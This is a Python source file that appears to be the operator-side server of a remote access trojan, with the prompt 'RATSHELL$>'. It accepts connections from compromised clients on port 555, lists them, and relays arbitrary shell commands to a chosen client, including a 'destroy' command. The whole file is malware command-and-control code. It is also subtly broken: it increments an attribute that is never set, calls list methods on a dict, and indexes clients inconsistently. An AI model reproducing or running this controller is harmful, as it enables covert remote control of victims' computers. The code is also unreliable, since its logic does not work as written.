import socket             
import threading
from entry import clientEntry

PORT = 555  




class Server:
    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         
        self.s.bind(('', PORT))         
        self.s.listen(5)     
        self.clients = {}
        self.cnt=0
        self.thread_accept=True
        
    def accept_clients(self):
        while self.thread_accept: 
            try:
                self.s.settimeout(1)  
                c, addr = self.s.accept()  
                det=c.recv(1024).decode()
                det=det.split(" ")
                self.client_id += 1
                client = clientEntry.clentry((c, addr), det[0], det[1], det[2])
                self.clients[self.client_id] = client
            except socket.timeout:
                continue 
           

    def shutdown(self):
        for cl in self.clients:
            cl.fd.close()
            self.clients.remove(cl)
    def list_clients(self):
        for i in self.clients:
            i.entry_print()

def main():
    server=Server()
    
    accept=threading.Thread(target=server.accept_clients)

    accept.start()

    while True:
        
        server_cm=input("RATSHELL$>")
        server_cm=server_cm.split(" ")
        if server_cm[0]=="LC" and len(server_cm)==1:
            server.list_clients()
        elif server_cm[0] == "EXIT" and len(server_cm)==1:
            
            server.thread_accept=False
            accept.join()
            server.s.close()
            break
            
        elif server_cm[0]=="CLIENT" and len(server_cm)==2:
            if 1==1:
                cl=server.clients[int(server_cm[1])-1]
                while True:
                    cm=input(str(cl.name)+"@"+str(cl.user)+"_$>")
                    cl.fd.send(cm.encode())
                    if cm=="destroy":
                        server.clients.remove(cl)
                        cl.fd.close()
                       
                    elif cm=="back":
                        break
                    elif cm=="exit":
                        server.clients.remove(cl)
                        break
                    res=cl.fd.recv(8192).decode()
                    print(res)

            else:
                print("client not exists")
        else:
            print("unknown command type help for help")
      
main()